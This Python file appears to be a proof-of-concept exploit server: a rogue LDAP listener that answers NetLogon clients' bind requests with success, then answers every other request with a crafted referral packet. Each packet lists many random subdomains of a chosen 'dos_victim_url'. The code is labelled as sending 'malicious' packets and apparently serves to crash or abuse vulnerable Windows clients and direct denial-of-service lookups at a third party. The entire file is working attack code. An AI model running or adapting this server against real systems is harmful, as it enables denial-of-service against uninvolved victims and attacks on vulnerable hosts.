import socket
import threading
from logger import logger
from ldaptor.protocols import pureldap
from ldaptor.protocols import pureber
import uuid

REFERRAL_RESULT_CODE = 10


class LDAPSearchResultDoneRefferal(pureldap.LDAPSearchResultDone):
    def toWire(self):
        elements = [
            pureber.BEREnumerated(self.resultCode),
            pureber.BEROctetString(self.matchedDN),
            pureber.BEROctetString(self.errorMessage),
        ]

        if self.resultCode == REFERRAL_RESULT_CODE:  # LDAP referral result code
            if self.referral:
                elements.append(
                    pureber.BERSequence(
                        [pureber.BEROctetString(url) for url in self.referral],
                        tag=0xA3  # Context-specific tag for referral
                    )
                )

        if self.serverSaslCreds:
            elements.append(pureldap.LDAPBindResponse_serverSaslCreds(self.serverSaslCreds))

        return pureber.BERSequence(elements, tag=self.tag).toWire()


def get_multi_referral_ldap_packet(message_id: int, referrals: list) -> bytes:

    ldap_search_result = LDAPSearchResultDoneRefferal(
        resultCode=REFERRAL_RESULT_CODE,
        referral=referrals
    )
    ldap_response_message = pureldap.LDAPMessage(
        value=ldap_search_result,
        id=message_id
    )
    bytes_to_send = ldap_response_message.toWire()

    return bytes_to_send


def handle_connection(conn, addr, count, dos_victim_url):
    berdecoder = pureldap.LDAPBERDecoderContext_TopLevel(
        inherit=pureldap.LDAPBERDecoderContext_LDAPMessage(
            fallback=pureldap.LDAPBERDecoderContext(
                fallback=pureber.BERDecoderContext()
            ),
            inherit=pureldap.LDAPBERDecoderContext(
                fallback=pureber.BERDecoderContext()
            ),
        )
    )
    count = count
    referrals = [f'ldap://{str(uuid.uuid4())}.{dos_victim_url}' for _ in range(count)]
    buffer = bytearray()

    logger.debug(f"NetLogon connected from {addr}")

    while True:
        data = conn.recv(4096)
        if not data:
            break
        buffer.extend(data)

        try:
            ldap_message, length_consumed = pureber.berDecodeObject(
                berdecoder, buffer
            )
        except pureber.BERExceptionInsufficientData:
            continue

        if ldap_message is None:
            continue

        del buffer[:length_consumed]
        request = ldap_message.value

        logger.debug("Received LDAP request from NetLogon")

        if isinstance(request, pureldap.LDAPBindRequest):
            logger.debug("Processing LDAP bind request")

            bind_response = pureldap.LDAPBindResponse(
                resultCode=0,
                matchedDN='',
                errorMessage=''
            )
            response_message = pureldap.LDAPMessage(
                value=bind_response,
                id=ldap_message.id
            )
            response_bytes = response_message.toWire()

            logger.debug(f"Sending LDAP bind success response to {addr}")
            conn.sendall(response_bytes)

        else:
            logger.debug("Processing non-bind LDAP request as malicious referral")

            vulnerable_ldap_packet = get_multi_referral_ldap_packet(ldap_message.id, referrals)

            logger.debug(f"Sending malicious LDAP response packet to {addr}")
            conn.sendall(vulnerable_ldap_packet)

    conn.close()
    logger.debug("Connection closed")


def run_server(listen_port: int, count: int, dos_victim_url: str):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', listen_port))
    server_socket.listen(5)
    logger.debug(f"TCP LDAP server listening on 0.0.0.0:{listen_port}")

    try:
        while True:
            conn, addr = server_socket.accept()
            threading.Thread(target=handle_connection, args=(conn, addr, count, dos_victim_url)).start()
    except KeyboardInterrupt:
        logger.debug("Server shutting down due to KeyboardInterrupt")
    finally:
        server_socket.close()
        logger.debug("Server has been shut down.")
